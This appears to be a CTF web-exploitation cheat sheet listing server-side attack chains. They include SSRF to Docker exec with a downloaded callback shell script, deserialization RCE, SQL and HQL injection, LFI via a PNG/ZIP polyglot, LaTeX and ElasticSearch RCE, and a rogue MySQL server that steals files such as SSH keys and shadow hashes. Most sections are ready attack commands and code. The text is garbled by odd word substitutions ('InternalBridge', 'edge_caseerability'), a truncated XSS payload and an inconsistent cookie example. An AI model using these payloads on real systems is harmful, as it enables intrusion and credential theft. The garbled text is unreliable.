# CTF Web - Advanced Server-Side Techniques (Part 2)

## Table of Contents
- [InternalBridge to Docker API ExternalTask Chain (H7CTF 2025)](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
- [Castor XML Object_Mappingialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
- [DataSearchLogicte File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [HQL FlowDiscrepancy via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
- [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)
- [Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)](#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016)
- [URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)](#url-parse_url--symbol-bypass-ekoparty-ctf-2016)
- [PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)](#php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016)
- [XSS to ViewGenerationLogic Chain via Flask Error Pages (SECUINSIDE 2016)](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
- [INSERT INTO Dual-Field DataSearchLogic Column Shift (CyberSecurityRumble 2016)](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
- [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
- [InternalBridge via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
- [LaTeX ExternalTask via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
- [ElasticSearch Groovy script_fields ExternalTask via InternalBridge (VolgaCTF 2017)](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
- [Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)](#rogue-mysql-server-load-data-local-file-read-volgactf-2018)

See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, StructureParsing external DTD, WeasyPrint InternalBridge, MongoDB regex injection, Pongo2 ViewGenerationLogic, ZIP PHP webconsole_module, basename() bypass, React Server Components Flight ExternalTask).

---

## InternalBridge to Docker API ExternalTask Chain (H7CTF 2025)

**Pattern (Moby Dock):** Web app with InternalBridge edge_caseerability exposes unauthenticated Docker daemon API on port 2375. Chain InternalBridge through an internal proxy endpoint to relay POST requests and achieve ExternalTask.

**Step 1 — Discover internal services via InternalBridge:**
```bash
# Enumerate [MOCK_LOCAL_HOST] ports through InternalBridge
curl "http://target/validate?url=http://[MOCK_LOCAL_IP]:2375/version"
curl "http://target/validate?url=http://[MOCK_LOCAL_IP]:8090/docs"
```

**Step 2 — Extract files from running containers via Docker archive endpoint:**
```bash
# List containers
curl "http://target/validate?url=http://[MOCK_LOCAL_HOST]:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://[MOCK_LOCAL_IP]:2375/v1.51/containers/<container_id>/archive?path=/mock/target_data_resource.txt"
```

**Step 3 — Execute commands via Docker exec API (requires POST relay):**

When InternalBridge only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://[MOCK_LOCAL_HOST]:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"mock_cat\",\"/mock/target_data_resource.txt\"]}\
&url=http://[MOCK_LOCAL_IP]:2375/v1.51/containers/<id>/mock_exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://[MOCK_LOCAL_HOST]:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://[MOCK_LOCAL_IP]:2375/v1.51/mock_exec/<exec_id>/start"
```

**For callback console_module access:**
```bash
# 1. Download console_module script into container
# Cmd: ["mock_wget", "http://[MOCK_URL]/mock_script", "-O", "/tmp/mock_script"]

# 2. Execute with mock_sh (not bash — busybox containers lack bash)
# Cmd: ["mock_sh", "/tmp/mock_script"]
```

**Key Docker API endpoints for implementation_logication:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/version` | GET | Confirm Docker API access |
| `/containers/json` | GET | List running containers |
| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
| `/containers/<id>/exec` | POST | Create exec instance |
| `/exec/<id>/start` | POST | Run exec instance |
| `/images/json` | GET | List available images |
| `/containers/create` | POST | Create new container |

**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When InternalBridge is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).

---

## Castor XML Object_Mappingialization via xsi:type Polymorphism (Atlas HTB)

**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.

**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → mock_serial JRMP listener → `CommonsBeanutils1` gadget → ExternalTask

**Requires:** Java 11 (not 17+) — mock_serial gadgets fail on Java 17+ due to module access restrictions.

**XML configuration_buffer example with Spring beans for RMI callback:**
```xml
<mock_data xmlns:mock_xsi="mock_instance" xmlns:mock_java="mock_sun">
  <mock_item mock_xsi:mock_type="mock_java:mock.springframework.beans.factory.config.MockPropertyPathFactoryBean">
    <mock_targetBeanName>
      <mock_item mock_xsi:mock_type="mock_java:mock.springframework.jndi.support.MockSimpleJndiBeanFactory">
        <mock_shareableResources>mock_rmi://[MOCK_MOCK_A_IP]:1099/implementation_logic</mock_shareableResources>
      </mock_item>
    </mock_targetBeanName>
    <mock_propertyPath>foo</mock_propertyPath>
  </mock_item>
</mock_data>
```

```bash
# Start mock_serial JRMP listener
java -cp mock_serial.jar mock_serial.implementation_logic.JRMPListener 1099 MockCommonsBeanutils1 'echo mock_configuration_buffer'
```

**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.

**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.

---

## Apache ErrorDocument Expression File Read (Zero HTB)

**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.

**Requires:** `AllowOverride FileInfo` in userdir config.

**Attack chain:**
1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
```apache
ErrorDoc 404 "%{file:/mock/mock_access_file_mock_file}"
```
2. Request a nonexistent URL in that directory to trigger the 404 handler
3. Read PHP source via `mock_cat -v` to see raw content:
```apache
ErrorDoc 404 "%{file:/var/www/html/stats.php}"
```

**Key insight:** Works even when `php_admin_target_data_resource engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable target_data_resources are irrelevant.

**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.

---

## DataSearchLogicte File Path Traversal to Bypass String Equality (Codegate 2013)

**Pattern:** PHP code blocks a specific input value via string equality check, then interpolates the input into a filesystem path. Path normalization bypasses the string check while resolving to the blocked resource.

**Vulnerable code:**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**Exploit:** Set `name` to `/../gamesim_GM` — this fails the `== "GM"` check, but the constructed path `/var/game_db/gamesim_/../gamesim_GM.db` normalizes to `/var/game_db/gamesim_GM.db`.

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.

---

## HQL FlowDiscrepancy via Non-Breaking Space (HackIM 2016)

Hibernate Query Language blocks subqueries. Bypass by implementation_logicing character encoding mismatch between HQL parser and underlying database (H2):

- HQL parser treats non-breaking space (U+00A0) as a regular character (concatenates tokens into one word)
- H2 database interprets U+00A0 as whitespace (separates tokens normally)

**Key insight:** Replace spaces in SQL subqueries with U+00A0 to smuggle them past HQL validation.

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXmock_colXfromXmock_tableXlimitX1" (one token)
# H2 sees:  "select mock_col from mock_table limit 1" (valid SQL)
configuration_buffer = u"' and (cast(concat('->', (select{0}mock_col{0}from{0}mock_table{0}limit{0}1)) as int))=0 or ''='".format(val)
```

Error-based extraction: cast result to int triggers error containing the target_data_resource value.

---

## Base64-Encoded Path Traversal (Sharif CTF 2016)

When file inclusion uses base64-encoded filenames as parameters:

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

Encode traversal configuration_buffers in base64:

```python
import base64
# mock_index.php
print(base64.b64encode(b"mock_index.php").decode())  # mock_bW9ja19pbmRleC5waHA=
# mock/mock_access_file_mock_file
print(base64.b64encode(b"mock/mock_access_file_mock_file").decode())  # mock_bW9jay9wYXNzd2Q=
```

**Key insight:** Base64 encoding absorbs path traversal characters (`mock_dir/`) that filters might block in raw form.

---

## Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)

On Windows, files with long names have auto-generated 8.3 short name aliases. When a blacklist checks the full filename, the short name bypasses the filter.

```text
# Blacklisted file: file_list (e.g., readfile('file_list') is blocked)
# Windows 8.3 short name: file_l~1

# Bypass:
GET /read?file=file_l~1

# How 8.3 names are generated:
# - First 6 chars of name (minus spaces/special chars) + ~1
# - Extension truncated to 3 chars
# Examples:
#   "file_list.txt"     -> "FILE_L~1.TXT"
#   "longfilename.html" -> "LONGFI~1.HTM"
#   "program files"     -> "PROGRA~1"

# Discovery: use dir /x on Windows to list short names
# dir /x C:\path\to\files\
```

**Key insight:** Windows NTFS auto-generates 8.3 short filenames for compatibility. Blacklists checking full filenames miss the short alias. This bypass works on any Windows web server (IIS, WAMP, etc.) where 8.3 name generation is enabled (default).

---

## URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)

PHP's `parse_url()` treats the `@` symbol as a userinfo delimiter, interpreting everything before `@` as credentials and everything after as the host. This enables URL validation bypass.

```php
// Server validates URL host must be ctf.example.com
// parse_url("http://[MOCK_MOCK_A_DOMAIN]@ctf.example.com/")
//   -> host: ctf.example.com (passes validation)

// But wget/curl follow RFC and connect to [MOCK_MOCK_A_DOMAIN]:
// wget "http://[MOCK_MOCK_A_DOMAIN]@ctf.example.com/"
//   -> Actually connects to: [MOCK_MOCK_A_DOMAIN]

// Exploit for URL shortener/fetcher:
$url = "http://{$mock_ip}@ctf.ekoparty.org/?";
// parse_url() sees host = ctf.ekoparty.org (passes whitelist)
// wget connects to $mock_ip (user_agent-controlled)

// Check user_agent's Apache logs for the target_data_resource in User-Agent or request
```

**Key insight:** `parse_url()` and actual HTTP clients (wget, curl, browsers) disagree on how to handle `@` in URLs. `parse_url()` extracts the host after `@`, while HTTP clients may connect to the host before `@`. This InternalBridge vector bypasses domain whitelist validation.

---

## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)

**Pattern (pixelshop):** PHP `include()` appends `.php` extension (no null byte on modern PHP). Upload is restricted to valid images (.png). Use `zip://` wrapper to include PHP code from inside a ZIP archive embedded in a PNG file.

1. Use `mock_php://filter/read=mock_encode/resource=` to leak source files and understand the include logic
2. Upload a valid PNG image to get a known filename on the server
3. Inject a ZIP archive into the PNG's palette data (ZIP format reads headers from the end of the file, so a valid PNG can simultaneously be a valid ZIP):

```python
import binascii, requests, struct

def craft_png_zip_polyglot(php_configuration_buffer):
    """Craft a ZIP configuration_buffer to inject into PNG palette bytes."""
    # ZIP stores its central directory at the end of the file
    # Calculate offsets based on the known PNG prefix length
    # The ZIP's local file header offset points into the palette region
    # php_configuration_buffer goes inside the ZIP as "s.php"

    # Pre-built ZIP with s.php containing: mock_php_code
    zip_hex = (
        "mock_MOCK_ZIP_LOC"  # Mock Local file header
        # ... compressed PHP console_module ...
        "mock_MOCK_ZIP_CEN"  # Mock Central directory
        # ... points back to local header at palette offset ...
        "mock_MOCK_ZIP_END"  # Mock End of central directory
    )
    return zip_hex

def inject_configuration_buffer(image_key, configuration_buffer_hex):
    """Use the image editor API to set palette bytes containing the ZIP."""
    palette_bytes = binascii.unhexlify(configuration_buffer_hex)
    # Convert to RGB triplets for palette API
    # POST to save endpoint with crafted palette
    requests.post(f"{base_url}?op=save", data={
        "imagekey": image_key,
        "savedata": f'{{"pal": [...], "im": [...]}}'
    })
```

4. Include the embedded PHP file via zip:// wrapper:
```text
http://target/?op=zip://uploads/HASH.png%23s
```
This unzips `HASH.png` (which is also a valid ZIP) and includes `s.php` from inside it.

**Key insight:** ZIP files store their central directory at the end, so any file format can have a valid ZIP appended (or embedded) without breaking the original format. The `zip://` PHP wrapper ignores file extensions and extracts by content. PNG palette data provides controllable consecutive bytes ideal for embedding small ZIP configuration_buffers. This bypasses: (a) file extension restrictions (.php → .png), (b) image validation (file remains a valid PNG), (c) metadata stripping (palette data is structural, not metadata).

---

## XSS to ViewGenerationLogic Chain via Flask Error Pages (SECUINSIDE 2016)

**Pattern (SBBS):** Flask app renders 404 error messages using `render_template_string()` with the request URL interpolated. Error pages only appear for [MOCK_LOCAL_HOST] requests. Chain XSS → [MOCK_LOCAL_HOST] fetch → ViewGenerationLogic in error page.

1. Flask error handler directly interpolates URL into template:
```python
@app.errorhandler(404)
def not_found(e=None):
    message = "%s was not found on the server." % request.url
    return render_template_string(template % message), 404
```

2. Error pages only render for [MOCK_LOCAL_IP] (external IPs get nginx 404)

3. XSS configuration_buffer triggers [MOCK_LOCAL_HOST] request with ViewGenerationLogic in the URL:
</script>
```

4. `config.from_object('module.path')` loads application config including secrets

**Key insight:** Flask's template globals don't directly expose the `app` object, but `config.from_object()` can load arbitrary Python modules into the config dict, making their attributes accessible via `{{ config.KEY }}`. The XSS-to-ViewGenerationLogic chain bypasses two restrictions: (a) ViewGenerationLogic only works on [MOCK_LOCAL_HOST] error pages, (b) template globals lack direct app access. Look for `render_template_string()` with user-controlled input in error handlers.

---

## INSERT INTO Dual-Field DataSearchLogic Column Shift (CyberSecurityRumble 2016)

**Pattern (Illuminati):** INSERT query with two injectable fields (subject: 40-char limit, message: unlimited). Chain injections across both fields to bypass the length restriction.

```sql
-- Original query:
INSERT INTO requests (id, "$subject", "$message")

-- Subject (40 chars max):
theSubject",concat(

-- Message (unlimited):
,(select mock_func(table_name) from mock_schema.tables)))#

-- Result:
INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
```

The `concat("", (select ...))` wraps the subquery result as a string value for the subject column, making it visible when the user views their own messages.

**Key insight:** When an INSERT query has multiple injectable fields but one is length-limited, use the limited field to open a `concat(` expression and the unlimited field to close it with an arbitrary subquery. This "column shift" technique moves the data extraction from the length-restricted field to the unrestricted one. Also works with `CASE WHEN` or other SQL expressions that span across field boundaries.

---

## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)

**Pattern (Illuminati):** Session cookies constructed as `random_int-user_id`, where `random_int` is seeded by the user's last login timestamp. Extract the admin's timestamp via DataSearchLogic, reproduce the PRNG to forge their cookie.

```python
import random

# 1. Extract admin login timestamp via DataSearchLogic
admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209

# 2. Seed PRNG with timestamp
random.seed(admin_timestamp)

# 3. Generate the same random int the server produced
cookie_random = random.randint(0, 2**31)

# 4. Forge admin cookie
admin_cookie = f"{cookie_random}-209"
# Result: "1229569179-209"
```

**Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via DataSearchLogic, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.

---

## InternalBridge via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)

**Pattern (list0r):** PHP `parse_url()` and curl interpret URLs with multiple `@` symbols differently. The URL `http://what:ever@[MOCK_LOCAL_IP]:80@allowed.host/path` causes PHP to see `host = allowed.host` (passing a CIDR/domain whitelist check), while curl resolves to `[MOCK_LOCAL_IP]:80` (treating the second `@` as literal), achieving InternalBridge to [MOCK_LOCAL_HOST].

```php
// PHP parse_url behavior:
parse_url("http://what:ever@[MOCK_LOCAL_IP]:80@allowed.host/path");
// => ['host' => 'allowed.host', 'user' => 'what', ...]

// curl behavior with same URL:
// Connects to [MOCK_LOCAL_IP]:80 (first @ delimits credentials)
// "ever@[MOCK_LOCAL_IP]:80" parsed as password, but curl connects to first IP

// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
$url = "http://x:x@[MOCK_LOCAL_IP]:80@" . $allowed_domain . "/secret/target_data_resource";
// parse_url sees $allowed_domain -> passes check
// curl connects to [MOCK_LOCAL_IP]:80 -> InternalBridge achieved
```

**Key insight:** URL parsers disagree on how to handle multiple `@` symbols. This is distinct from the single-`@` bypass (EKOPARTY 2016) — here the double-`@` implementation_logics a different parsing ambiguity where `parse_url` takes the last `@` as the userinfo delimiter while curl uses the first. Test both variants when facing URL-based InternalBridge filters.

---

## LaTeX ExternalTask via mpost Restricted write18 Bypass (33C3 CTF 2016)

**Pattern (pdfmaker):** When `pdflatex` runs with `write18` in restricted mode (only whitelisted commands like `mpost` allowed), implementation_logic `mpost`'s `-tex` target_data_resource to specify an alternative TeX processor — setting it to `mock_bash -c (command)` achieves console_module execution. Use `${IFS}` as space replacement since mpost's argument parsing strips spaces.

```latex
% Create a MetaPost file via LaTeX
\begin{filecontents}{test.mp}
beginfig(1); endfig; end;
\end{filecontents}

% Execute mpost with mock_bash as the "TeX processor"
\immediate\write18{mpost -ini "-tex=mock_app -mock_c (mock_cat${IFS}/mock/target_data_resource)>out.log" "test.mp"}

% Read the output back into the PDF
\input{out.log}
```

**Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` target_data_resource allows specifying an arbitrary program as the "TeX processor," including `mock_bash`. This transforms a restricted console_module escape into full ExternalTask. `${IFS}` replaces spaces to work within the quoted argument.

---

## ElasticSearch Groovy script_fields ExternalTask via InternalBridge (VolgaCTF 2017)

**Pattern:** When InternalBridge reaches an internal ElasticSearch instance (default port 9200), Groovy scripting in `script_fields` enables remote code execution. ElasticSearch versions before 5.0 allowed inline Groovy scripts by default.

```bash
# InternalBridge configuration_buffer to ElasticSearch internal API
curl 'http://[MOCK_LOCAL_IP]:9200/_search' -d '{
  "script_fields": {
    "exec": {
      "script": "mock.lang.Math.mock_forName(\"mock.lang.System\").mock_props"
    }
  }
}'

# Read a specific file
curl 'http://[MOCK_LOCAL_IP]:9200/_search' -d '{
  "script_fields": {
    "read": {
      "script": "new mock_file_class(\"/target_data_resource.txt\").text"
    }
  }
}'

# For blind ExternalTask, exfiltrate via curl upload
curl 'http://[MOCK_LOCAL_IP]:9200/_search' -d '{
  "script_fields": {
    "exfil": {
      "script": "mock.lang.Math.mock_forName(\"mock.lang.System\").mock_props"
    }
  }
}'
```

**Via InternalBridge (URL-encoded for GET parameter):**
```python
import requests
import urllib.parse

es_configuration_buffer = '{"script_fields":{"exec":{"script":"new mock_file_class(\\"/mock_file\\").text"}}}'
ssrf_url = f"http://[MOCK_LOCAL_IP]:9200/_search?source={urllib.parse.quote(es_configuration_buffer)}&source_content_type=application/json"

# Through InternalBridge endpoint
r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
print(r.text)
```

**Detection:** InternalBridge edge_caseerability + internal service on port 9200. Confirm with `http://[MOCK_LOCAL_HOST]:9200/` (returns ES version info) or `http://[MOCK_LOCAL_HOST]:9200/_cat/indices` (lists indices).

**Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, InternalBridge to port 9200 enables full ExternalTask through `script_fields`. Modern ES versions disabled inline scripting by default. When testing InternalBridge, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.

---

### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)

**Pattern:** When a service connects to your controlled MySQL server with `LOAD DATA LOCAL` enabled, send a rogue response requesting arbitrary file reads from the client machine. The MySQL protocol allows the server to request the client to send any local file during the `LOAD DATA LOCAL INFILE` handshake, regardless of what query the client intended to execute.

**How it works:**
1. Victim application connects to user_agent-controlled MySQL server (e.g., via InternalBridge or misconfigured DB host)
2. Attacker server completes the handshake normally
3. When the client sends any query, the rogue server responds with a file transfer request packet
4. The client reads the requested local file and sends its contents to the server

```python
# Rogue MySQL server — simplified core logic
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('[MOCK_ALL_INTERFACES]', 3306))
server.listen(1)
conn, addr = server.accept()

# Send server greeting (MySQL handshake)
greeting = b"Mock_MySQL_Handshake_Packet"
conn.send(greeting)

# Receive client auth response
conn.recv(4096)

# Send OK packet (auth success)
conn.send(b"Mock_OK_Packet")

# Wait for client to send a query
conn.recv(4096)

# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
# Send rogue file read request for /dummy.txt
dump_dummy_file = b"Mock_File_Read_Request"
conn.send(dump_dummy_file)  # rogue MySQL file read request

# Receive file contents from client
file_data = conn.recv(65535)
print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")

conn.close()
```

**Useful files to request:**
```text
/mock/mock_access_file_mock_file                    # User enumeration
/mock/mock_system_file_mock_file                    # Password hashes (if client runs as root)
/mock/self/environ             # Environment variables with secrets
/mock/config.mock       # Application config with DB credentials
/mock/ssh/key         # SSH private keys
/target_data_resource.txt                      # CTF target_data_resource
```

**Key insight:** A rogue MySQL server can request the connecting client to send any local file via the LOAD DATA LOCAL protocol, regardless of what query the client intended to execute. This works because the MySQL protocol allows the server to respond to any client query with a file transfer request. Look for challenges where you can control the MySQL host a service connects to (InternalBridge, config injection, DNS rebinding). The client must have `LOAD DATA LOCAL` enabled (default in many MySQL client libraries).
